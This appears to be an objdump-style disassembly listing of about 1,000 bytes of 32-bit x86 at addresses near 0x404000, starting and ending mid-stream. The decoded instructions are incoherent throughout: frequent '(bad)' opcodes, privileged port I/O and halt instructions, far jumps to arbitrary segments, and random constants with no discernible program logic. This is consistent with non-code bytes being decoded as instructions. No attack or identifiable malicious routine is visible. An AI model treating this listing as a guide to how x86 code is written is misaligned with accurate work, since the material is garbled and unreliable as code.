  40409a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40409b:	test   BYTE PTR [ebp-0x17],0xfc
  40409f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040a0:	mov    ebx,0x95f5d09f
  4040a5:	(bad)  
  4040a6:	jb     0x40409a
  4040a8:	dec    edx
  4040a9:	xor    DWORD PTR [eax-0x115a16e5],ebp
  4040af:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4040b1:	dec    ebp
  4040b2:	jle    0x404121
  4040b4:	inc    ebp
  4040b5:	xor    dl,0xf5
  4040b8:	cli    
  4040b9:	loop   0x404049
  4040bb:	xchg   ebx,eax
  4040bc:	dec    eax
  4040be:	sbb    al,0x7e
  4040c0:	aam    0xdd
  4040c2:	push   0x30
  4040c4:	fs mov dl,0xae
  4040c7:	fmulp  st(3),st
  4040c9:	dec    esi
  4040ca:	cmp    al,0x11
  4040cc:	cdq    
  4040cd:	fyl2x  
  4040cf:	cmp    al,0xe0
  4040d1:	sbb    ah,bh
  4040d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040d4:	mov    eax,ds:0xbb8fbd93
  4040d9:	fwait
  4040da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040db:	jle    0x40414f
  4040dd:	pop    ds
  4040de:	(bad)  
  4040df:	imul   ecx,DWORD PTR [edx-0x69c46147],0xa71b6905
  4040e9:	xchg   esp,eax
  4040ea:	sub    edx,DWORD PTR [esi+0x12d7c36a]
  4040f0:	add    ebp,DWORD PTR [edx-0x7f]
  4040f3:	sbb    al,0xa8
  4040f5:	lods   eax,DWORD PTR ds:[esi]
  4040f6:	leave  
  4040f7:	sti    
  4040f8:	pop    ecx
  4040f9:	das    
  4040fa:	fst    DWORD PTR [edx+0x6954de63]
  404100:	test   DWORD PTR [eax-0x7157eec5],edx
  404106:	mov    WORD PTR [edi-0x23],ss
  404109:	and    ecx,DWORD PTR [ebp-0x74c40216]
  40410f:	push   ebx
  404110:	fs lahf 
  404112:	sbb    eax,0xc920c674
  404117:	xor    eax,0x2ad02660
  40411c:	das    
  40411d:	lock pop edi
  40411f:	lods   eax,DWORD PTR ds:[esi]
  404120:	xor    DWORD PTR [esi],esp
  404122:	in     al,0x6a
  404124:	imul   esp,DWORD PTR [edi+0x2c],0x3d
  404128:	in     eax,dx
  404129:	inc    ecx
  40412a:	inc    ebx
  40412b:	mov    ah,0xc
  40412d:	mov    ds:0x9fdb9346,al
  404132:	dec    ebp
  404133:	retf   0xce4f
  404136:	ret    0xd1c
  404139:	mov    ecx,0x2ad6282c
  40413e:	pop    ebp
  40413f:	xor    esi,eax
  404141:	fistp  DWORD PTR [ebx-0x36]
  404144:	mov    edx,0x84631fb9
  404149:	push   edi
  40414a:	sbb    eax,0xf526136e
  40414f:	add    eax,0xedfc54c0
  404154:	pushf  
  404155:	lds    ebp,FWORD PTR [esi]
  404157:	cmp    al,bl
  404159:	inc    esp
  40415a:	or     DWORD PTR [edi-0xf],ebp
  40415d:	sub    al,ah
  40415f:	sub    al,0x55
  404161:	jmp    0x404157
  404163:	xchg   esp,eax
  404164:	and    esp,edx
  404166:	jmp    0x133:0x92ba532c
  40416d:	mov    dl,0xa7
  40416f:	stos   BYTE PTR es:[edi],al
  404170:	sbb    esi,edx
  404172:	popf   
  404173:	call   0x223048f3
  404178:	sbb    dl,BYTE PTR [ebp+0x1762d9c0]
  40417e:	(bad)  
  40417f:	int3   
  404180:	cmp    eax,0xb32de200
  404185:	inc    edi
  404186:	jp     0x4041fb
  404188:	clc    
  404189:	cli    
  40418a:	sub    eax,0xede616c
  40418f:	adc    BYTE PTR [edx],al
  404191:	push   cs
  404192:	ret    
  404193:	lds    esi,FWORD PTR [ecx+edx*4-0x2bc1b3e4]
  40419a:	sahf   
  40419b:	fmulp  st(7),st
  40419d:	fsub   st(7),st
  40419f:	dec    ecx
  4041a0:	mov    edx,0xdc20440e
  4041a5:	popa   
  4041a6:	push   0xa663fb8f
  4041ab:	cmp    esp,ebp
  4041ad:	xlat   BYTE PTR ds:[ebx]
  4041ae:	mov    dl,0x32
  4041b0:	ss mov edx,0x52df6ba0
  4041b6:	cmp    al,0x41
  4041b8:	mov    edi,0x53dc6428
  4041bd:	mov    bh,0xb1
  4041bf:	inc    ecx
  4041c0:	out    0xce,al
  4041c2:	arpl   WORD PTR [eax],si
  4041c4:	addr16 das 
  4041c6:	ins    BYTE PTR es:[edi],dx
  4041c7:	leave  
  4041c8:	stos   BYTE PTR es:[edi],al
  4041c9:	jb     0x40416c
  4041cb:	das    
  4041cc:	mov    esp,0x906b3c4d
  4041d1:	mov    ecx,0x5627a30e
  4041d6:	add    eax,0x6a0a32cc
  4041db:	and    eax,0xbcb30a75
  4041e0:	retf   0x5fe7
  4041e3:	dec    ebx
  4041e4:	fsubp  st(5),st
  4041e6:	sbb    eax,0xba7b2596
  4041eb:	mov    dh,0x54
  4041ed:	sub    edx,edi
  4041ef:	imul   esi,DWORD PTR [ecx],0x2f
  4041f2:	out    0xb3,eax
  4041f4:	rcr    DWORD PTR ds:0xb47746ee,cl
  4041fa:	sbb    DWORD PTR [esi+ebp*2-0x294fc72c],eax
  404201:	dec    eax
  404202:	rcl    DWORD PTR [edi],0x8a
  404205:	add    al,0xa7
  404208:	mov    bl,0xdb
  40420a:	into   
  40420b:	cmp    DWORD PTR [edx+0x1d],0xffffffee
  40420f:	mov    cl,0x5f
  404211:	cmp    ecx,DWORD PTR [eax+ebp*1]
  404214:	nop
  404215:	sbb    esp,edx
  404217:	cld    
  404218:	js     0x404256
  40421a:	sub    DWORD PTR [ebx-0x192a4ff1],edx
  404220:	data16 in al,dx
  404222:	mov    ebp,esi
  404224:	fs push esi
  404226:	pop    ebp
  404227:	(bad)  
  404228:	(bad)  
  404229:	jns    0x4041b8
  40422b:	cmove  edx,DWORD PTR [ecx-0x1640067e]
  404232:	nop
  404233:	mov    DWORD PTR [ebx+edi*1],ecx
  404236:	retf   0xf430
  404239:	and    BYTE PTR [eax-0x1742d458],bh
  40423f:	jb     0x404200
  404241:	sbb    al,0x0
  404243:	iret   
  404244:	mov    esp,esi
  404246:	adc    edi,DWORD PTR [edi]
  404248:	ss (bad) 
  40424a:	or     eax,0x4ab30143
  40424f:	xchg   ebp,eax
  404250:	sbb    DWORD PTR [ecx-0x98b1656],0xc3ac0272
  40425a:	pop    edx
  40425b:	hlt    
  40425c:	mov    eax,ds:0x3d749de6
  404261:	test   al,0x3b
  404263:	retf   0x8596
  404266:	(bad)  
  404267:	sub    eax,0xf89f3cc
  40426c:	cmp    al,0xea
  40426e:	(bad)  
  40426f:	jl     0x4042c1
  404271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404272:	push   cs
  404273:	add    al,0x6b
  404275:	mov    al,0x1a
  404277:	(bad)  
  404278:	loope  0x404213
  40427a:	(bad)  
  40427c:	and    BYTE PTR [ebx+ebp*1+0x2a],dh
  404280:	inc    ebx
  404281:	scas   al,BYTE PTR es:[edi]
  404282:	fs popf 
  404284:	dec    esi
  404285:	fwait
  404286:	pusha  
  404287:	add    edi,DWORD PTR [esi]
  404289:	xchg   edi,eax
  40428a:	rol    al,0xad
  40428d:	das    
  40428e:	xlat   BYTE PTR ds:[ebx]
  40428f:	add    DWORD PTR [edi+0x69ce3e01],0x22594519
  404299:	cmp    BYTE PTR ds:0x76d2e34a,bl
  40429f:	sbb    DWORD PTR [ecx],edi
  4042a1:	xlat   BYTE PTR ds:[ebx]
  4042a2:	mov    ss,WORD PTR [esi-0x47]
  4042a5:	cli    
  4042a6:	mov    ecx,0x6076b41a
  4042ab:	pop    eax
  4042ac:	mov    bh,BYTE PTR [ebp-0x7ed741fb]
  4042b2:	push   0xe983ed8f
  4042b7:	sbb    eax,0xe8e43e5
  4042bc:	xor    bh,bl
  4042be:	pop    eax
  4042bf:	popa   
  4042c0:	aas    
  4042c1:	xor    DWORD PTR [esi+0x4],edx
  4042c4:	pop    esp
  4042c5:	fmul   QWORD PTR [ecx-0x3b05d55e]
  4042cb:	mov    esp,0xf855d459
  4042d0:	push   edx
  4042d1:	xor    cl,ah
  4042d3:	xor    esp,DWORD PTR [esi+0x61fdf951]
  4042d9:	pop    ecx
  4042da:	inc    edi
  4042db:	jne    0x404303
  4042dd:	std    
  4042de:	aas    
  4042df:	xor    al,BYTE PTR [edi]
  4042e1:	xor    BYTE PTR [edi+0x41],0x82
  4042e5:	sub    eax,0xd2d740f4
  4042ea:	jg     0x40426f
  4042ec:	fisub  DWORD PTR [edx+0x5b9120d8]
  4042f2:	and    ch,BYTE PTR [eax+0x27bfc2a1]
  4042f8:	imul   ebx,ebx,0x3ade7cc4
  4042fe:	dec    ebp
  4042ff:	dec    edi
  404300:	jp     0x4042f8
  404302:	fisttp DWORD PTR [ebx+0x1a552a04]
  404308:	jg     0x4042d5
  40430a:	sahf   
  40430b:	in     eax,dx
  40430c:	mov    WORD PTR [edi-0x4],ds
  40430f:	ret    0x4e97
  404312:	pop    edi
  404313:	sbb    ebx,DWORD PTR [edx]
  404315:	imul   esi,DWORD PTR [esp+edi*1-0x64],0x73
  40431a:	mov    bh,0xfe
  40431c:	mov    DWORD PTR [edx-0x72],edi
  40431f:	(bad)  
  404321:	xor    ch,ch
  404323:	xchg   DWORD PTR [esp+esi*2+0x1deea6e4],esi
  40432a:	xor    eax,0xa6c6ba69
  40432f:	clc    
  404330:	imul   eax,DWORD PTR [ecx-0x49],0xd5724b68
  404337:	hlt    
  404338:	(bad)  
  404339:	sub    esi,DWORD PTR [eax+0x4e]
  40433c:	clc    
  40433d:	push   edi
  40433e:	inc    edi
  40433f:	jg     0x40432f
  404341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404342:	add    eax,0xc1a16128
  404347:	push   cs
  404348:	jns    0x4043a7
  40434a:	lahf   
  40434b:	(bad)  
  40434c:	mov    esi,0xba9cd73a
  404351:	inc    esp
  404352:	xlat   BYTE PTR ds:[ebx]
  404353:	in     al,0xc9
  404355:	push   es
  404356:	mov    ebp,0xab405829
  40435b:	je     0x4042f2
  40435d:	or     al,0x63
  40435f:	lds    ebp,FWORD PTR [ecx+0x39]
  404362:	(bad)  
  404363:	adc    eax,0xc229ce70
  404368:	lods   al,BYTE PTR ds:[esi]
  404369:	push   cs
  40436a:	mov    WORD PTR [ecx+0x72],?
  40436d:	mov    ch,0xd8
  40436f:	addr16 fdiv st,st(2)
  404372:	sti    
  404373:	popa   
  404374:	es std 
  404376:	gs cmp edi,ebp
  404379:	inc    ecx
  40437a:	adc    eax,0x28696b91
  40437f:	inc    edx
  404380:	sbb    ch,BYTE PTR [eax+0x7b]
  404383:	jg     0x40439e
  404385:	push   ds
  404386:	loope  0x40436c
  404388:	xor    bl,cl
  40438a:	lods   al,BYTE PTR ds:[esi]
  40438b:	adc    eax,0x9a31c94
  404390:	sub    ah,BYTE PTR [ecx-0x29578a36]
  404396:	(bad)  
  404397:	cmp    al,0x8b
  404399:	or     BYTE PTR ds:0x517f18dc,dl
  40439f:	fwait
  4043a0:	ror    BYTE PTR [eax],1
  4043a2:	push   cs
  4043a3:	mov    cl,0xc3
  4043a5:	ss inc esp
  4043a7:	add    edi,esi
  4043a9:	inc    edi
  4043aa:	sti    
  4043ab:	sub    edi,eax
  4043ad:	inc    edx
  4043ae:	cmc    
  4043af:	xor    eax,0x14b8c78c
  4043b4:	fcomp  QWORD PTR [ebp*8+0x617373c1]
  4043bb:	repz mov bl,0x34
  4043be:	xchg   esp,eax
  4043bf:	cmp    esi,DWORD PTR [edi+0x5d]
  4043c2:	dec    ebx
  4043c3:	push   es
  4043c4:	xor    BYTE PTR [ecx-0x1a57c046],dh
  4043ca:	test   al,al
  4043cc:	add    al,0x90
  4043ce:	and    eax,0xad34a73c
  4043d3:	dec    edx
  4043d4:	push   ebp
  4043d5:	jecxz  0x4043e1
  4043d7:	and    eax,0xe85e1745
  4043dc:	xchg   ebp,eax
  4043dd:	aad    0x9d
  4043df:	jbe    0x40441b
  4043e1:	std    
  4043e2:	enter  0x9cd3,0x20
  4043e6:	sar    cl,cl
  4043e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e9:	mov    ds:0xc364414c,eax
  4043ee:	cmp    eax,0xadd252eb
  4043f3:	mov    edx,0xa355e0cd
  4043f8:	or     BYTE PTR [esi],0xa6
  4043fb:	push   ss
  4043fc:	pop    edi
  4043fd:	test   eax,0x594840d3
  404402:	(bad)  
  404403:	push   es
  404404:	push   edx
  404405:	pop    eax
  404406:	paddw  mm3,mm1
  404409:	mov    eax,0x91f2217e
  40440e:	mov    gs,WORD PTR [ebx]
  404410:	xor    bl,ch
  404412:	ins    DWORD PTR es:[edi],dx
  404413:	sub    BYTE PTR [edx],al
  404415:	retf   
  404416:	mov    ebp,0x3f4f68b0
  40441b:	sbb    ecx,DWORD PTR [ebp+0x5e]
  40441e:	jecxz  0x404477
  404420:	mov    edi,0xb44ae1f9
  404425:	sar    DWORD PTR [ebx],0xbd
  404428:	clc    
  404429:	mov    ds:0xf7c2c0a1,al
  40442e:	push   es
  40442f:	cwde   
  404430:	gs push ss
  404432:	inc    esp
  404433:	ins    BYTE PTR es:[edi],dx
  404434:	jns    0x404422
  404436:	push   esi
  404437:	xchg   DWORD PTR [ebx],edx
  404439:	xlat   BYTE PTR ds:[ebx]
  40443a:	pop    ebp
  40443b:	aad    0x9f
  40443d:	cwde   
  40443e:	sub    esi,DWORD PTR [eax+0x71]
  404441:	xchg   edx,eax
  404442:	(bad)  
  404443:	pusha  
  404444:	pop    edi
  404445:	mov    al,ds:0xf0957177
  40444a:	fwait
  40444b:	cmp    al,0x14
  40444d:	jge    0x4044a5
  40444f:	stc    
  404450:	lods   al,BYTE PTR ds:[esi]
  404451:	std    
  404452:	adc    BYTE PTR [edx+0x75],dh
  404455:	sbb    eax,0x3331211a
  40445a:	fdiv   DWORD PTR [edi+eiz*8-0x1a]
  40445e:	pop    ss
  40445f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404460:	sub    al,0x7c
  404462:	arpl   WORD PTR [eax+0x16],sp
  404465:	jmp    0xb73e:0xe75fe627
  40446c:	cs sbb al,0x8f
  40446f:	in     al,dx
  404470:	xor    DWORD PTR [edx+0x1c],ebp
  404473:	ret    0x97a1
  404476:	mov    fs,WORD PTR [eax]
  404478:	inc    esp
  404479:	cmp    eax,0xeb5e1371
  40447e:	int    0xbc
  404480:	mov    bl,cl
  404482:	pusha  
  404483:	and    DWORD PTR [edx+ebp*4+0x1e98ab9e],ebx
  40448a:	push   ss
  40448b:	or     edx,DWORD PTR [esi+0x348b8270]
  404491:	(bad)  
  404492:	repnz push esp
  404494:	lock (bad) 
  404496:	arpl   WORD PTR [ebx],bp
  404498:	bound  edx,QWORD PTR [ecx-0x3f411a21]
  40449e:	rcl    BYTE PTR [esi+0x5b6d0a53],1
  4044a4:	push   eax
  4044a5:	pop    ds
  4044a6:	or     ecx,esp
  4044a8:	loope  0x404449
  4044aa:	fucomi st,st(2)
  4044ac:	adc    cl,BYTE PTR fs:[ebp-0x1fc1aa32]
  4044b3:	sbb    DWORD PTR [ebp+0x63455c8e],0xc355a469
  4044bd:	add    al,0xd6
  4044bf:	jne    0x4044fe
  4044c1:	inc    edi
  4044c2:	daa    
  4044c3:	jle    0x404477
  4044c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c6:	push   ss
  4044c7:	adc    eax,0xd62999c6
  4044cc:	mov    al,0x6a
  4044ce:	ins    DWORD PTR es:[edi],dx
  4044cf:	ja     0x404501
  4044d1:	std    
  4044d2:	gs stos DWORD PTR es:[edi],eax
  4044d4:	mov    cl,0xa4
  4044d6:	je     0x40452f
  4044d8:	sub    BYTE PTR [eax+0x37],0xe4
  4044dc:	sbb    BYTE PTR [edx+ebx*2+0x75],ah
  4044e0:	hlt    
  4044e1:	aas    
  4044e2:	in     eax,0xae
  4044e4:	mov    ds:0x8be58344,eax
  4044e9:	gs jl  0x404553
  4044ec:	js     0x4044a4
  4044ee:	mov    cl,0x2f
  4044f0:	jmp    0x4044e6
  4044f2:	cwde   
  4044f3:	mov    al,ds:0xe9a3b93
  4044f8:	cmp    edi,0x78
  4044fb:	xchg   edx,eax
  4044fc:	imul   ecx,DWORD PTR [ebx-0x67597892],0x6
  404503:	jl     0x4044e3
  404505:	ins    BYTE PTR es:[edi],dx
  404506:	mov    WORD PTR [ebx],fs
  404508:	scas   eax,DWORD PTR es:[edi]
  404509:	mov    ecx,0x50d8b106
  40450e:	icebp  
  40450f:	aam    0xd4
  404511:	ja     0x404511
  404513:	(bad)  
  404514:	in     eax,0xc5
  404516:	and    ch,dl
  404518:	add    edx,DWORD PTR ds:0x90569a36
  40451e:	jne    0x404521
  404520:	mov    ds:0x8d5d1f25,eax
  404525:	jp     0x4044f4
  404527:	mov    edi,0xc5af5d36
  40452c:	and    eax,esp
  40452e:	cmp    BYTE PTR [esi-0x1],0x32
  404532:	push   ds
  404533:	adc    edi,edi
  404535:	iret   
  404536:	das    
  404537:	inc    esi
  404538:	lods   al,BYTE PTR ds:[esi]
  404539:	xchg   edx,eax
  40453a:	xchg   esi,eax
  40453b:	fcom   QWORD PTR [edi-0x70]
  40453e:	pop    ebp
  40453f:	mov    al,0x67
  404541:	pop    esi
  404542:	dec    ecx
  404543:	test   DWORD PTR [edx+eax*8],0x1ae248a7
  40454a:	clc    
  40454b:	test   al,0x74
  40454d:	push   ecx
  40454e:	enter  0x968,0xdf
  404552:	jecxz  0x404598
  404554:	sub    ch,bh
  404556:	xlat   BYTE PTR ds:[ebx]
  404557:	mov    edi,0x55f27002
  40455c:	adc    BYTE PTR [ecx-0x53],bh
  40455f:	loop   0x404513
  404561:	and    BYTE PTR [ebp+0x2c],al
  404564:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404565:	not    BYTE PTR [ebp+0x59e9d404]
  40456b:	out    0x7e,eax
  40456d:	and    DWORD PTR [eax],ecx
  40456f:	call   FWORD PTR [edx-0x9]
  404572:	adc    BYTE PTR [esi-0x18],al
  404575:	test   eax,0xc368fca3
  40457a:	sbb    al,0x9
  40457c:	inc    esp
  40457d:	rcr    BYTE PTR [ebp+0x3a],0x89
  404581:	test   al,0xb1
  404583:	lods   al,BYTE PTR ds:[esi]
  404584:	pop    eax
  404585:	lods   al,BYTE PTR ds:[esi]
  404586:	jae    0x40452a
  404588:	adc    al,0xd5
  40458a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40458b:	add    BYTE PTR [ecx+0x1bf81b8a],ch
  404591:	inc    esi
  404592:	mov    al,0xce
  404594:	div    DWORD PTR [edi+0x5a718659]
  40459a:	in     eax,0xd
  40459c:	mov    BYTE PTR [eax+0x185caf98],0xf6
  4045a3:	mov    dh,0xc3
  4045a5:	add    DWORD PTR [edi],edi
  4045a7:	jmp    0x6e1d:0x868792ec
  4045ae:	out    0x24,al
  4045b0:	inc    ebx
  4045b1:	fs pusha 
  4045b3:	push   ds
  4045b4:	adc    ebx,esi
  4045b6:	mov    ds:0x596985d3,eax
  4045bb:	scas   al,BYTE PTR es:[edi]
  4045bc:	xchg   ecx,eax
  4045bd:	jne    0x404616
  4045bf:	and    BYTE PTR [ecx-0x44],dh
  4045c2:	adc    DWORD PTR [ecx+0x17],ebp
  4045c5:	pop    esp
  4045c6:	mov    cl,0x8
  4045c8:	dec    esi
  4045c9:	aad    0x98
  4045cb:	or     ah,0x5a
  4045ce:	inc    ebp
  4045cf:	or     al,0xf1
  4045d1:	fist   WORD PTR [eax-0x2b]
  4045d4:	xor    eax,0x4868c12e
  4045d9:	adc    BYTE PTR [ebx],bh
  4045db:	lock mov ebp,0x9b17305a
  4045e1:	inc    edi
  4045e2:	xor    ah,BYTE PTR ds:0x3f31c7a6
  4045e8:	add    bl,BYTE PTR ds:0xb69ef1ed
  4045ee:	mov    al,ds:0x814235e3
  4045f3:	xchg   esp,eax
  4045f4:	cmp    eax,0x8023326b
  4045f9:	add    DWORD PTR [edi+0x59],esp
  4045fc:	fdivr  DWORD PTR [ecx+ebp*4]
  4045ff:	pop    esp
  404600:	or     DWORD PTR [ebp+0x646acb7b],eax
  404606:	adc    BYTE PTR ds:0x238502a6,cl
  40460c:	stc    
  40460d:	or     ecx,DWORD PTR [edx-0x210e771f]
  404613:	push   ebx
  404614:	(bad)  
  404615:	(bad)  
  404616:	sbb    eax,0x827b42b5
  40461b:	add    BYTE PTR [edx+0x5e],dl
  40461e:	iret   
  40461f:	xor    ecx,DWORD PTR [ecx-0x4369acd1]
  404625:	jnp    0x40465a
  404627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404628:	lahf   
  404629:	je     0x4046a4
  40462b:	cld    
  40462c:	cwde   
  40462d:	nop
  40462e:	add    al,0x3d
  404630:	mov    ebp,0xd4a30688
  404635:	cmp    DWORD PTR [ebx+0x3],ecx
  404638:	xchg   DWORD PTR [ecx+0x6f],ebp
  40463b:	in     al,dx
  40463c:	dec    esi
  40463d:	je     0x404619
  40463f:	dec    ebx
  404640:	xchg   BYTE PTR [edi-0x7a5727d6],cl
  404646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404647:	mov    edi,0x269ef1d9
  40464c:	cmc    
  40464d:	int    0x25
  40464f:	mov    ebx,0x5da8f349
  404654:	adc    al,0x4a
  404656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404657:	xor    esi,ebx
  404659:	mov    WORD PTR [ebx-0x3ab1fa2a],ds
  40465f:	fdivr  DWORD PTR [ecx]
  404661:	and    eax,0x292fecdf
  404666:	xor    DWORD PTR [esi-0x18],esi
  404669:	icebp  
  40466a:	xor    al,0x3e
  40466c:	ret    
  40466d:	fwait
  40466e:	adc    al,0xdd
  404670:	or     DWORD PTR [ebx+0x3b],edx
  404673:	mov    dh,0xe0
  404675:	pop    ss
  404676:	dec    ecx
  404677:	retf   
  404678:	inc    edi
  404679:	mov    BYTE PTR [edx+0x3a834c19],al
  40467f:	cmp    ah,BYTE PTR [ecx]
  404681:	rol    BYTE PTR [ecx],0xd1
  404684:	pop    es
  404685:	bnd jo 0x4046b5
  404688:	adc    BYTE PTR [eax-0x1e],0xb6
  40468c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468d:	ror    BYTE PTR [eax-0x967405d],cl
  404693:	pop    esp
  404695:	inc    eax
  404696:	push   edx
  404697:	iret   
  404698:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404699:	jge    0x4046a4
  40469b:	outs   dx,BYTE PTR ds:[esi]
  40469c:	popa   
  40469d:	outs   dx,BYTE PTR ds:[esi]
  40469e:	mov    al,0x4
  4046a0:	push   ebp
  4046a1:	fwait
  4046a2:	dec    esi
  4046a3:	mov    ch,0xa4
  4046a5:	(bad)  
  4046a7:	mov    eax,ebp
  4046a9:	fnstenv [ebp+ebx*4-0x6c]
  4046ad:	repnz loopne 0x404668
  4046b0:	addr16 (bad) 
  4046b2:	clc    
  4046b3:	cmp    ah,BYTE PTR [ebx+0x172767ec]
  4046b9:	sbb    al,dh
  4046bb:	nop
  4046bc:	outs   dx,BYTE PTR ds:[esi]
  4046bd:	adc    esi,DWORD PTR [edi+0x1c]
  4046c0:	ja     0x404644
  4046c2:	xchg   esi,eax
  4046c3:	(bad)  
  4046c4:	pop    ecx
  4046c5:	psllw  mm6,mm7
  4046c8:	mov    esp,0x9d6d3473
  4046cd:	stc    
  4046ce:	fldcw  WORD PTR [eax-0x70063ec1]
  4046d4:	or     BYTE PTR ds:0xa4e7beb1,bl
  4046da:	dec    eax
  4046db:	inc    esi
  4046dc:	mov    ds:0x21e72437,eax
  4046e1:	cld    
  4046e2:	add    eax,0xac78352b
  4046e7:	xchg   ecx,eax
  4046e8:	or     DWORD PTR [ebx-0x6],ecx
  4046eb:	test   BYTE PTR [eax+0x43],ah
  4046ee:	xchg   esi,eax
  4046ef:	pop    esi
  4046f0:	jg     0x4046d5
  4046f2:	cli    
  4046f3:	or     edi,edi
  4046f5:	mov    cl,0x59
  4046f7:	push   ss
  4046f8:	mov    dl,0x7e
  4046fa:	push   cs
  4046fb:	call   0x975b7602
  404700:	enter  0x1eaf,0x1a
  404704:	sub    ch,al
  404706:	test   BYTE PTR [esi+0x273eacbb],ah
  40470c:	pusha  
  40470d:	pop    esp
  40470e:	jecxz  0x40477f
  404710:	fwait
  404711:	test   eax,0x5f1357f2
  404717:	fldcw  WORD PTR [eiz*8+0x2073266c]
  40471e:	adc    al,0x53
  404720:	popa   
  404721:	lock and esi,DWORD PTR [esp+edi*4]
  404725:	in     al,0xf9
  404727:	test   al,0x11
  404729:	sti    
  40472a:	mov    ch,0xd6
  40472c:	dec    eax
  40472d:	cli    
  40472e:	or     eax,0x527855de
  404733:	xchg   ecx,eax
  404734:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  404736:	fidivr WORD PTR [esi+0x10]
  404739:	fdiv   st(6),st
  40473b:	and    eax,0xe833516f
  404740:	shl    dh,cl
  404742:	jle    0x4047ad
  404744:	repnz mov edi,0x8458dddc
  40474a:	adc    DWORD PTR [edx+0x36],esp
  40474d:	and    BYTE PTR [edx+0xb],bl
  404750:	jmp    DWORD PTR [edi]
  404752:	es cmp eax,0x6c0fdef8
  404758:	pop    esp
  404759:	cmp    BYTE PTR [ebp+0x52],bh
  40475c:	ror    BYTE PTR [esi+ebx*4],0x93
  404760:	test   eax,0xf6fe0b1a
  404765:	add    eax,0x29d9e36f
  40476a:	addr16 dec eax
  40476c:	out    0xd6,al
  40476e:	and    BYTE PTR [eax-0x378200a6],al
  404774:	sbb    DWORD PTR [ebx],ecx
  404776:	lds    ebp,FWORD PTR [eax+edi*4]
  404779:	or     al,0xb1
  40477b:	ins    DWORD PTR es:[edi],dx
  40477c:	repnz dec BYTE PTR [edx]
  40477f:	pop    edi
  404780:	clc    
  404781:	dec    ebp
  404782:	hlt    
  404783:	scas   al,BYTE PTR es:[edi]
  404784:	ret    0x84de
  404787:	inc    eax
  404788:	imul   esi,DWORD PTR [ebx+0x44b01665],0x62
  40478f:	sahf   
  404790:	cmp    al,0xf7
  404792:	ret    0xe39
  404795:	pushf  
  404796:	xchg   edx,eax
  404797:	popf   
  404798:	dec    eax
  404799:	loop   0x4047c7
  40479b:	jmp    0x404804
  40479d:	xchg   esp,eax
  40479e:	adc    DWORD PTR [edx+0x3ef07c3f],ecx
  4047a4:	ss jns 0x4047b8
  4047a7:	setb   BYTE PTR [ecx-0x79]
  4047ab:	std    
  4047ac:	lods   al,BYTE PTR ds:[esi]
  4047ad:	lahf   
  4047ae:	retf   
  4047af:	jno    0x4047f0
  4047b1:	push   cs
  4047b2:	mov    dl,0x28
  4047b4:	or     al,ch
  4047b6:	mov    eax,ds:0x2d57a1c0
  4047bb:	pop    edi
  4047bc:	mov    dl,0xb9
  4047be:	mov    edx,0xcb6b8303
  4047c3:	push   0x17f910f
  4047c8:	adc    DWORD PTR [ecx+ebx*1],esi
  4047cb:	loopne 0x404819
  4047cd:	cwde   
  4047ce:	jecxz  0x404783
  4047d0:	mov    bl,BYTE PTR [ebx+ebx*4]
  4047d3:	test   eax,0xffa89f4a
  4047d8:	adc    DWORD PTR [eax-0x1d44b16a],0x3c1ab7c3
  4047e2:	mov    ds:0x9df0c24d,eax
  4047e7:	pop    es
  4047e8:	dec    edi
  4047e9:	or     bl,BYTE PTR [edi]
  4047eb:	push   esi
  4047ec:	idiv   DWORD PTR [esp+ecx*8-0x2ec16a08]
  4047f3:	scas   eax,DWORD PTR es:[edi]
  4047f4:	jp     0x404802
  4047f6:	push   ebx
  4047f7:	(bad)  
  4047f8:	fsub   QWORD PTR ds:[eax+0x1]
  4047fc:	mov    dh,0x7d
  4047fe:	cdq    
  4047ff:	ficomp DWORD PTR [esi+ebx*1+0x6d]
  404803:	stos   DWORD PTR es:[edi],eax
  404804:	and    BYTE PTR [eax-0x3],cl
  404807:	push   ebx
  404808:	pop    ebx
  404809:	cld    
  40480a:	test   BYTE PTR [ebp+0x70ab7813],bh
  404810:	je     0x4047ba
  404812:	adc    eax,ebx
  404814:	mov    ebp,0x9fd1282f
  404819:	stos   BYTE PTR es:[edi],al
  40481a:	lock cld 
  40481c:	retf   0x4e0f
  40481f:	adc    al,0x6a
  404821:	sub    eax,DWORD PTR [edi+0x14621a29]
  404827:	mov    cl,0x95
  404829:	cld    
  40482a:	push   0xfffffff4
  40482c:	jge    0x404830
  40482e:	inc    ebx
  40482f:	push   ebx
  404830:	sbb    edi,ebp
  404832:	adc    ebp,ebx
  404834:	inc    eax
  404835:	jno    0x4047ec
  404837:	rcr    BYTE PTR [ecx+0x1f],1
  40483a:	stos   BYTE PTR es:[edi],al
  40483b:	inc    esp
  40483c:	jo     0x4048bd
  40483e:	push   ecx
  40483f:	mov    bl,0x68
  404841:	test   al,0x16
  404843:	mov    ah,0xc3
  404845:	add    cl,BYTE PTR [edi-0x59e6a8de]
  40484b:	adc    al,0x27
  40484d:	shl    cl,0x8d
  404850:	loope  0x40484e
  404852:	pop    ss
  404853:	jns    0x404870
  404855:	cmc    
  404856:	cld    
  404857:	test   eax,0x379a733b
  40485c:	sub    BYTE PTR ds:0x8ab62fd5,ch
  404862:	sbb    ecx,edx
  404864:	in     al,0xf2
  404866:	retf   
  404867:	ret    
  404868:	cmp    al,0x64
  40486a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40486b:	sub    DWORD PTR [edx-0x19],0xd9260e46
  404872:	push   cs
  404873:	outs   dx,BYTE PTR ds:[esi]
  404874:	sub    al,0x5b
  404876:	into   
  404877:	mov    ds:0x7376590f,eax
